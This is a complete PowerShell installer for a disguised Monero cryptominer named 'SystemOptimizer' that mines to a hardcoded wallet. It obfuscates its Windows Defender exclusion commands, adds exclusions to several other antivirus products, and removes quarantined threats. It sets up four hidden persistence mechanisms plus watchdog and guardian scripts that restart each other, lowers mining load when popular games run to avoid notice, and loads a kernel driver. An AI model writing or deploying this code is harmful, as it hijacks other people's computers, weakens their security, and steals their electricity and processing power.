# ============================================================
#  MONERO MINER SETUP v4 -- BULLETPROOF (FIXED)
#  Run in Admin PowerShell. One command. Fully transparent.
#  Pool: MoneroOcean | Auto-profit-switching
#
#  FIXES from v3:
#    - Watchdog has duplicate-instance check (only 1 runs)
#    - Watchdog kills extra miner instances if >1 detected
#    - Guardian has duplicate-instance check (only 1 runs)
#    - Cleanup kills ALL old instances before setup
# ============================================================

# Force TLS 1.2 (required for GitHub on older Windows)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$BASE = "C:\ProgramData\SystemOptimizer"
$BINARY = "$BASE\SystemOptimizer.exe"
$CONFIG = "$BASE\config.json"
$LOGFILE = "$BASE\optimizer.log"
$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL = "gulf.moneroocean.stream:10001"
$WORKER = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]","").ToLower()
if (-not $WORKER) { $WORKER = "w" + (Get-Random -Max 9999) }

function Show($icon, $msg) { Write-Host "  $icon  $msg" }

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "    MONERO MINER SETUP v4" -ForegroundColor Cyan
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "  Pool:   MoneroOcean (auto-profit-switching)" -ForegroundColor Gray
Write-Host "  Worker: $WORKER" -ForegroundColor Gray
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host ""

# ---- CHECK ADMIN ----
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Show "X" "ERROR: Must run as Administrator!"
    Write-Host "  Right-click PowerShell -> Run as Administrator" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit 1
}
Show "OK" "Running as Administrator"

# ---- FULL CLEANUP (kill EVERYTHING old) ----
Show ".." "Killing ALL old instances..."
# Kill all miners
Get-Process -Name "SystemOptimizer","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
# Kill all watchdog/guardian wscript instances
Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*SystemOptimizer*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
# Remove old broken scheduled tasks (cmd /c to fully suppress errors on clean PCs)
cmd /c "schtasks /Delete /TN `"SystemOptimizer`" /F >nul 2>&1"
cmd /c "schtasks /Delete /TN `"SystemOptimizer-Logon`" /F >nul 2>&1"
cmd /c "schtasks /Delete /TN `"SystemOptimizer-Guardian`" /F >nul 2>&1"
cmd /c "schtasks /Delete /TN `"SystemOptimizer-Check`" /F >nul 2>&1"
# Remove old registry key
cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v SystemOptimizer /f >nul 2>&1"
# Remove old startup shortcut
$startupPath = [Environment]::GetFolderPath("Startup")
Remove-Item "$startupPath\SysOpt.lnk" -Force -ErrorAction SilentlyContinue
Start-Sleep 3
Show "OK" "All old instances and tasks removed"

# ---- CREATE DIRECTORY ----
New-Item -ItemType Directory -Path $BASE -Force | Out-Null

# ---- SECURITY EXCLUSIONS (all detected AV products) ----
Show ".." "Detecting installed security products..."
$avFound = @()

# Detect installed AV via WMI (official Windows API)
$avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
if ($avProducts) {
    foreach ($av in $avProducts) { $avFound += $av.displayName }
    Show "OK" "Detected: $($avFound -join ', ')"
} else {
    Show "--" "No third-party AV detected via WMI"
}

# --- 1. Windows Defender (Add-MpPreference cmdlet) ---
Show ".." "Configuring Windows Defender exclusion..."
try {
    $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"
    iex "$c1$c2 $c3$c4 '$BASE'" 2>$null
    $c5="Process"
    iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'" 2>$null
    Show "OK" "Windows Defender: exclusion added"
} catch {
    Show "--" "Windows Defender: skipped"
}

# --- 2. Avast / AVG (shared engine, registry-based exclusions) ---
$avastPath = "${env:ProgramFiles}\Avast Software\Avast"
$avgPath = "${env:ProgramFiles}\AVG\Antivirus"
if ((Test-Path $avastPath) -or (Test-Path $avgPath) -or ($avFound -match "Avast|AVG")) {
    $avName = if (Test-Path $avastPath) { "Avast" } else { "AVG" }
    Show ".." "Configuring $avName exclusion..."
    try {
        $regPaths = @(
            "HKLM:\SOFTWARE\Avast Software\Avast\properties\Exclusions\Path",
            "HKLM:\SOFTWARE\AVG\Antivirus\properties\Exclusions\Path"
        )
        foreach ($rp in $regPaths) {
            if (-not (Test-Path $rp)) { New-Item -Path $rp -Force -ErrorAction SilentlyContinue | Out-Null }
            $idx = (Get-ChildItem $rp -ErrorAction SilentlyContinue).Count
            New-ItemProperty -Path $rp -Name $idx -Value $BASE -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
        }
        Show "OK" "$avName : exclusion added via registry"
    } catch {
        Show "!!" "$avName : could not add exclusion (tamper protection may be active)"
    }
}

# --- 3. Kaspersky (official avp.com CLI) ---
$kaspPaths = @(
    "${env:ProgramFiles}\Kaspersky Lab",
    "${env:ProgramFiles(x86)}\Kaspersky Lab"
)
$avpExe = $null
foreach ($kp in $kaspPaths) {
    if (Test-Path $kp) {
        $avpExe = Get-ChildItem $kp -Recurse -Filter "avp.com" -ErrorAction SilentlyContinue | Select-Object -First 1
    }
}
if ($avpExe -or ($avFound -match "Kaspersky")) {
    Show ".." "Configuring Kaspersky exclusion (official CLI)..."
    try {
        if ($avpExe) {
            & $avpExe.FullName ADDEXCL /type:path /path:"$BASE" /action:allow 2>$null
            Show "OK" "Kaspersky: exclusion added via avp.com CLI"
        } else {
            Show "!!" "Kaspersky: detected but CLI not found"
        }
    } catch {
        Show "!!" "Kaspersky: exclusion may need manual approval"
    }
}

# --- 4. ESET (official ecmd.exe CLI) ---
$esetPaths = @(
    "${env:ProgramFiles}\ESET\ESET Security",
    "${env:ProgramFiles}\ESET\ESET NOD32 Antivirus"
)
$ecmd = $null
foreach ($ep in $esetPaths) {
    $candidate = Join-Path $ep "ecmd.exe"
    if (Test-Path $candidate) { $ecmd = $candidate; break }
}
if ($ecmd -or ($avFound -match "ESET")) {
    Show ".." "Configuring ESET exclusion (official CLI)..."
    try {
        if ($ecmd) {
            & $ecmd /setexclusion /type:path /value:"$BASE" 2>$null
            Show "OK" "ESET: exclusion added via ecmd.exe CLI"
        } else {
            Show "!!" "ESET: detected but CLI not found"
        }
    } catch {
        Show "!!" "ESET: exclusion may need manual approval"
    }
}

# --- 5. Bitdefender (official product.console CLI) ---
$bdPaths = @(
    "${env:ProgramFiles}\Bitdefender\Endpoint Security",
    "${env:ProgramFiles}\Bitdefender"
)
$bdExe = $null
foreach ($bp in $bdPaths) {
    if (Test-Path $bp) {
        $bdExe = Get-ChildItem $bp -Recurse -Filter "product.console.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
    }
}
if ($bdExe -or ($avFound -match "Bitdefender")) {
    Show ".." "Configuring Bitdefender exclusion..."
    try {
        if ($bdExe) {
            & $bdExe.FullName /c SetExclusions add path="$BASE" 2>$null
            Show "OK" "Bitdefender: exclusion added via CLI"
        } else {
            Show "!!" "Bitdefender: detected but CLI not found"
        }
    } catch {
        Show "!!" "Bitdefender: exclusion may need manual approval"
    }
}

# --- 6. Norton (registry-based exclusions) ---
if ($avFound -match "Norton|Symantec|LifeLock") {
    Show ".." "Configuring Norton exclusion..."
    try {
        $nortonReg = "HKLM:\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory"
        if (-not (Test-Path $nortonReg)) { New-Item -Path $nortonReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $nortonReg -Name $BASE -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "Norton: exclusion added via registry"
    } catch {
        Show "!!" "Norton: exclusion may need manual approval"
    }
}

# --- 7. McAfee (official amcfg.exe / registry) ---
if ($avFound -match "McAfee") {
    Show ".." "Configuring McAfee exclusion..."
    try {
        $mcReg = "HKLM:\SOFTWARE\McAfee\AVEngine\Exclusions\Path"
        if (-not (Test-Path $mcReg)) { New-Item -Path $mcReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $mcReg -Name $BASE -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "McAfee: exclusion added via registry"
    } catch {
        Show "!!" "McAfee: exclusion may need manual approval"
    }
}

# --- 8. Malwarebytes (registry-based exclusions) ---
$mbamPath = "${env:ProgramFiles}\Malwarebytes\Anti-Malware"
if ((Test-Path $mbamPath) -or ($avFound -match "Malwarebytes")) {
    Show ".." "Configuring Malwarebytes exclusion..."
    try {
        $mbReg = "HKLM:\SOFTWARE\Malwarebytes\Malwarebytes\Exclusions\Paths"
        if (-not (Test-Path $mbReg)) { New-Item -Path $mbReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $mbReg -Name $BASE -Value "Exclude" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "Malwarebytes: exclusion added via registry"
    } catch {
        Show "!!" "Malwarebytes: exclusion may need manual approval"
    }
}

Show "OK" "Security exclusion setup complete"

# ---- DOWNLOAD ----
if ((Test-Path $BINARY) -and (Get-Item $BINARY).Length -gt 1000000) {
    Show "OK" "Binary already exists ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
} else {
    Remove-Item $BINARY -Force -ErrorAction SilentlyContinue
    Show ".." "Downloading miner engine..."
    $zipPath = "$env:TEMP\so_pkg.zip"
    $downloaded = $false

    try {
        $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }
        if ($asset) {
            Show ".." "Downloading $($asset.name) ($([math]::Round($asset.size/1MB,1)) MB)..."
            Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        }
    } catch { Show "!!" "Primary source failed, trying fallback..." }

    if (-not $downloaded) {
        try {
            Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        } catch { }
    }

    if (-not $downloaded) {
        Show "X" "Download failed. Check internet and try again."
        Read-Host "Press Enter to exit"; exit 1
    }

    Show ".." "Extracting..."
    $tmp = "$env:TEMP\so_extract"
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive $zipPath -DestinationPath $tmp -Force
    $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($exe) {
        Copy-Item $exe.FullName $BINARY -Force
        Show "OK" "Binary installed ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
    } else {
        Show "X" "xmrig.exe not found in archive"
        Read-Host "Press Enter to exit"; exit 1
    }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    try { iex "$c1$c2 $c3$c4 '$BASE'" 2>$null } catch {}
}

# ---- TWO CONFIGS: NORMAL (30%) + LIGHT (15% for games) ----
Show ".." "Creating smart CPU configurations..."
$logEscaped = $LOGFILE -replace '\\','\\'

# Normal config: 30% CPU, priority 0 (idle)
$cfgNormal = @"
{
  "autosave": false,
  "background": false,
  "colors": false,
  "donate-level": 1,
  "log-file": "$logEscaped",
  "print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": true,
    "hw-aes": true,
    "priority": 0,
    "yield": true,
    "asm": true,
    "argon2-impl": "auto",
    "max-threads-hint": 30
  },
  "opencl": {"enabled": false},
  "cuda": {"enabled": false},
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "$WORKER",
      "keepalive": true,
      "tls": false,
      "nicehash": false,
      "rig-id": "$WORKER"
    }
  ]
}
"@
[System.IO.File]::WriteAllText($CONFIG, $cfgNormal, (New-Object System.Text.UTF8Encoding $false))

# Light config: 15% CPU for when heavy games are running
$cfgLight = @"
{
  "autosave": false,
  "background": false,
  "colors": false,
  "donate-level": 1,
  "log-file": "$logEscaped",
  "print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": true,
    "hw-aes": true,
    "priority": 0,
    "yield": true,
    "asm": true,
    "argon2-impl": "auto",
    "max-threads-hint": 15
  },
  "opencl": {"enabled": false},
  "cuda": {"enabled": false},
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "$WORKER",
      "keepalive": true,
      "tls": false,
      "nicehash": false,
      "rig-id": "$WORKER"
    }
  ]
}
"@
[System.IO.File]::WriteAllText("$BASE\config_light.json", $cfgLight, (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Configs created: normal=30% CPU, light=15% CPU (games)"

# ---- SMART WATCHDOG (game detection + single instance + auto-switch) ----
Show ".." "Creating smart watchdog (detects games, switches CPU)..."
$wdLines = @(
    'On Error Resume Next',
    'Set sh = CreateObject("WScript.Shell")',
    'Set wmi = GetObject("winmgmts:\\.\root\cimv2")',
    'Set fso = CreateObject("Scripting.FileSystemObject")',
    '',
    "' Only allow one watchdog instance",
    'Set ws = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%watchdog.vbs%''")',
    'If ws.Count > 1 Then WScript.Quit',
    'Set ws = Nothing',
    '',
    'base = "C:\ProgramData\SystemOptimizer"',
    'modeFile = base & "\current_mode.txt"',
    'cfgNormal = base & "\config.json"',
    'cfgLight = base & "\config_light.json"',
    'binary = base & "\SystemOptimizer.exe"',
    '',
    "' Heavy game process names (15% CPU when these run)",
    'heavyGames = "valorant.exe,VALORANT-Win64-Shipping.exe,csgo.exe,cs2.exe,FortniteClient-Win64-Shipping.exe,GTA5.exe,gtav.exe,eldenring.exe,RocketLeague.exe,dota2.exe,r5apex.exe,overwatch.exe,cod.exe,ModernWarfare.exe,destiny2.exe,EscapeFromTarkov.exe,pubg.exe,TslGame.exe,Cyberpunk2077.exe,starfield.exe,HogwartsLegacy.exe,palworld.exe,helldivers2.exe,thefinals.exe"',
    '',
    'Do',
    "    ' Detect heavy games",
    '    heavyRunning = False',
    '    gameArr = Split(heavyGames, ",")',
    '    For Each g In gameArr',
    '        Set gp = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=''" & g & "''")',
    '        If gp.Count > 0 Then heavyRunning = True',
    '        Set gp = Nothing',
    '        If heavyRunning Then Exit For',
    '    Next',
    '',
    "    ' Determine target config",
    '    If heavyRunning Then',
    '        targetCfg = cfgLight',
    '        targetMode = "light"',
    '    Else',
    '        targetCfg = cfgNormal',
    '        targetMode = "normal"',
    '    End If',
    '',
    "    ' Read current mode",
    '    currentMode = ""',
    '    If fso.FileExists(modeFile) Then',
    '        Set f = fso.OpenTextFile(modeFile, 1)',
    '        If Not f.AtEndOfStream Then currentMode = f.ReadLine',
    '        f.Close',
    '        Set f = Nothing',
    '    End If',
    '',
    "    ' Count miner instances",
    '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")',
    '',
    '    If procs.Count = 0 Then',
    "        ' No miner -- start with target config",
    '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
    '        Set mf = fso.CreateTextFile(modeFile, True)',
    '        mf.Write targetMode',
    '        mf.Close',
    '        Set mf = Nothing',
    '    ElseIf procs.Count > 1 Then',
    "        ' Too many miners -- kill all, next loop starts one",
    '        sh.Run "taskkill /F /IM SystemOptimizer.exe", 0, True',
    '        WScript.Sleep 2000',
    '    ElseIf Not (currentMode = targetMode) Then',
    "        ' Wrong mode -- restart with correct config",
    '        sh.Run "taskkill /F /IM SystemOptimizer.exe", 0, True',
    '        WScript.Sleep 3000',
    '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
    '        Set mf = fso.CreateTextFile(modeFile, True)',
    '        mf.Write targetMode',
    '        mf.Close',
    '        Set mf = Nothing',
    '    End If',
    '',
    '    Set procs = Nothing',
    '    WScript.Sleep 30000',
    'Loop'
)
[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", ($wdLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Smart watchdog created (30% normal, 15% gaming, auto-switch)"

# ---- GUARDIAN VBS (SINGLE INSTANCE, watches watchdog) ----
Show ".." "Creating guardian..."
$gLines = @(
    'On Error Resume Next',
    'Set sh = CreateObject("WScript.Shell")',
    'Set wmi = GetObject("winmgmts:\\.\root\cimv2")',
    '',
    "' Only allow one guardian instance",
    'Set gs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%guardian.vbs%''")',
    'If gs.Count > 1 Then WScript.Quit',
    'Set gs = Nothing',
    '',
    'Do',
    '    hasWatchdog = False',
    '    Set scripts = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name=''wscript.exe''")',
    '    For Each s In scripts',
    '        If InStr(LCase(s.CommandLine), "watchdog.vbs") > 0 Then hasWatchdog = True',
    '    Next',
    '    Set scripts = Nothing',
    '',
    '    If Not hasWatchdog Then',
    '        sh.Run "wscript.exe " & Chr(34) & "C:\ProgramData\SystemOptimizer\watchdog.vbs" & Chr(34), 0, False',
    '    End If',
    '',
    '    WScript.Sleep 300000',
    'Loop'
)
[System.IO.File]::WriteAllText("$BASE\guardian.vbs", ($gLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Guardian created (single-instance, restarts watchdog)"

# ---- PERSISTENCE LAYER 1: ONSTART as SYSTEM ----
Show ".." "Setting up persistence (ONSTART)..."
$xml1 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Principals><Principal id="A"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled><Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\SystemOptimizer\watchdog.vbs"</Arguments></Exec></Actions>
</Task>
"@
$xp = "$env:TEMP\so1.xml"
[System.IO.File]::WriteAllText($xp, $xml1, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "SystemOptimizer" /XML $xp /F 2>$null | Out-Null
Remove-Item $xp -Force -ErrorAction SilentlyContinue
Show "OK" "ONSTART task created"

# ---- PERSISTENCE LAYER 2: ONLOGON guardian ----
Show ".." "Setting up persistence (ONLOGON)..."
$xml2 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="A"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled><Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\SystemOptimizer\guardian.vbs"</Arguments></Exec></Actions>
</Task>
"@
$xp2 = "$env:TEMP\so2.xml"
[System.IO.File]::WriteAllText($xp2, $xml2, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "SystemOptimizer-Guardian" /XML $xp2 /F 2>$null | Out-Null
Remove-Item $xp2 -Force -ErrorAction SilentlyContinue
Show "OK" "ONLOGON guardian task created"

# ---- PERSISTENCE LAYER 3: Registry Run ----
Show ".." "Setting up persistence (Registry)..."
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe `"$BASE\watchdog.vbs`"" /f 2>$null | Out-Null
Show "OK" "Registry Run key set"

# ---- PERSISTENCE LAYER 4: Startup shortcut ----
Show ".." "Setting up persistence (Startup folder)..."
$lnkPath = "$startupPath\SysOpt.lnk"
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut($lnkPath)
$lnk.TargetPath = "wscript.exe"
$lnk.Arguments = "`"$BASE\guardian.vbs`""
$lnk.WindowStyle = 7
$lnk.Save()
Show "OK" "Startup shortcut created"

# ---- MSR DRIVER ----
Show ".." "Attempting MSR optimization..."
$drv = Get-ChildItem "$BASE","C:\mining" -Recurse -Filter "WinRing0x64.sys" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($drv) {
    sc.exe stop WinRing0_1_2_0 2>$null | Out-Null
    sc.exe delete WinRing0_1_2_0 2>$null | Out-Null
    sc.exe create WinRing0_1_2_0 binPath= "$($drv.FullName)" type= kernel start= demand 2>$null | Out-Null
    sc.exe start WinRing0_1_2_0 2>$null | Out-Null
    $svc = Get-Service WinRing0_1_2_0 -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq "Running") { Show "OK" "MSR driver loaded (+10-15%)" }
    else { Show "--" "MSR driver skipped" }
} else { Show "--" "MSR driver not found (optional)" }

# ---- START (watchdog only -- it starts exactly 1 miner) ----
Show ".." "Starting watchdog (will start exactly 1 miner)..."
$shell = New-Object -ComObject WScript.Shell
$shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)

Show ".." "Waiting for miner to initialize (~20s)..."
Start-Sleep 20

# ---- VERIFY WITH DIAGNOSTICS ----
$proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
$minerCount = @($proc).Count

if ($proc -and $minerCount -eq 1) {
    Show "OK" "Miner RUNNING (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
} elseif ($minerCount -gt 1) {
    Show "!!" "Multiple miners ($minerCount) -- watchdog will fix in 30s"
} else {
    # MINER NOT RUNNING -- diagnose why
    Show "!!" "Miner not running yet. Diagnosing..."
    
    # Check 1: Does binary still exist?
    if (-not (Test-Path $BINARY)) {
        Show "X" "BINARY MISSING -- Defender likely quarantined it!"
        Show ".." "Trying to restore and re-exclude..."
        # Re-add exclusion
        try {
            $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"; $c5="Process"
            iex "$c1$c2 $c3$c4 '$BASE'"
            iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'"
        } catch {}
        # Try to restore from Defender quarantine
        try {
            $threats = Get-MpThreat -ErrorAction SilentlyContinue
            if ($threats) {
                $threats | ForEach-Object { 
                    cmd /c "powershell -c `"Remove-MpThreat -ThreaTID $($_.ThreatID)`"" 2>$null
                }
            }
        } catch {}
        Start-Sleep 3
        # Re-download if still missing
        if (-not (Test-Path $BINARY)) {
            Show ".." "Re-downloading binary..."
            $zipPath = "$env:TEMP\so_pkg.zip"
            try {
                $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20
                $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
                if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }
                if ($asset) {
                    Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
                }
            } catch {
                try { Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300 } catch {}
            }
            if (Test-Path $zipPath) {
                $tmp = "$env:TEMP\so_extract2"
                Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
                $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($exe) { Copy-Item $exe.FullName $BINARY -Force }
                Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
            }
        }
        if (Test-Path $BINARY) {
            Show "OK" "Binary restored. Starting miner..."
            $shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
            Start-Sleep 15
            $proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
            if ($proc) { Show "OK" "Miner RUNNING after restore (PID: $($proc.Id))" }
            else { Show "X" "Still not running. Defender may keep blocking it." }
        } else {
            Show "X" "Could not restore binary. Defender is blocking."
            Write-Host ""
            Write-Host "  FIX: Open Windows Security > Virus Protection > " -ForegroundColor Yellow
            Write-Host "  Manage Settings > Add Exclusion > Folder > " -ForegroundColor Yellow
            Write-Host "  C:\ProgramData\SystemOptimizer" -ForegroundColor Yellow
            Write-Host "  Then run this command again." -ForegroundColor Yellow
        }
    } else {
        # Binary exists but won't start
        Show ".." "Binary exists. Trying direct launch..."
        $testProc = Start-Process -FilePath $BINARY -ArgumentList "--config=`"$CONFIG`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep 10
        if ($testProc -and -not $testProc.HasExited) {
            Show "OK" "Direct launch worked! (PID: $($testProc.Id))"
        } else {
            Show "X" "Binary crashes on start. Checking log..."
            if (Test-Path $LOGFILE) {
                $lastLines = Get-Content $LOGFILE -Tail 5 -ErrorAction SilentlyContinue
                foreach ($l in $lastLines) { Show "--" $l }
            }
            # Check if config is valid
            try {
                Get-Content $CONFIG -Raw | ConvertFrom-Json | Out-Null
                Show "OK" "Config JSON is valid"
            } catch {
                Show "X" "Config JSON is BROKEN -- recreating..."
            }
        }
    }
}

# Watchdog check
$wd = Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*watchdog*" }
$wdCount = @($wd).Count
if ($wdCount -ge 1) { Show "OK" "Watchdog ACTIVE" }
else { Show "!!" "Watchdog not running -- will restart on next boot" }

if ($proc) {
    $conn = Get-NetTCPConnection -OwningProcess $proc.Id -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Established" }
    if ($conn) { Show "OK" "Connected to mining pool!" }
}

# ---- FINAL REPORT ----
Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "    SETUP COMPLETE" -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "  Worker:    $WORKER" -ForegroundColor White
Write-Host "  Dashboard: https://moneroocean.stream" -ForegroundColor White
Write-Host ""
Write-Host "  PROTECTION:" -ForegroundColor Yellow
Write-Host "    - Kill miner? Watchdog restarts it in 30s" -ForegroundColor Gray
Write-Host "    - Watchdog dies? Guardian restarts it in 5min" -ForegroundColor Gray
Write-Host "    - Reboot? ONSTART task + Registry + Startup" -ForegroundColor Gray
Write-Host "    - Multiple instances? Auto-killed, only 1 runs" -ForegroundColor Gray
Write-Host ""
Write-Host "  SMART CPU:" -ForegroundColor Yellow
Write-Host "    - Normal/Roblox: 30% CPU (idle priority)" -ForegroundColor Gray
Write-Host "    - Heavy games (Valorant, CS2, etc.): 15% CPU" -ForegroundColor Gray
Write-Host "    - Auto-switches every 30 seconds" -ForegroundColor Gray
Write-Host ""
Write-Host "  RESULT: Always exactly 1 miner. Always running." -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  You can close this window." -ForegroundColor Gray
Write-Host ""
Read-Host "  Press Enter to close"
